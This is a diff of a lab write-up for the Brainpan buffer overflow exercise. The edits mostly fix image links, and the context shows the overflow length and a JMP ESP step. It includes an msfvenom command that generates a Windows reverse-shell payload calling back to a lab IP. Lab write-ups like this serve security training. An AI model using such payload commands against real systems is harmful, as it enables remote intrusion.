@@ -78,7 +78,7 @@ Let's download the .exe file and have the look with `strings`
 Here, the Windows IP address given by DHCP is '192.168.56.105'. Use the script above and see what the program spits out.
 It turns out that the overflow occurs around(/with circa) 900 A's.
 
-![sending A's](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/sending-A's.png)
+![sending A's](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/sending-A's.png?raw=true)
 
 Stack addresses EAX EIP ESP
 
@@ -105,7 +105,9 @@ for i in range(30):
 Here, the Windows IP address given by DHCP is '192.168.56.105'. Use the script above and see what the program spits out.
 It turns out that the overflow occurs around(/with circa) 900 A's.
 
-![sending A's](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/generating-shellcode.png?raw=true)
+![sending A's](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/pattern_create.png?raw=true)
+
+Metasploit generator is a handy tool, though it is abysmally slow
 
 Stack addresses EAX EIP ESP
 
@@ -152,7 +154,7 @@ Setting JMP ESP address and shellcode
 
 `msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
 
-![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/generating-shellcode.png)
+![](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/generating-shellcode.png?raw=true)
 
 ## Conclusion and benefits
 It was an opportunity to improve
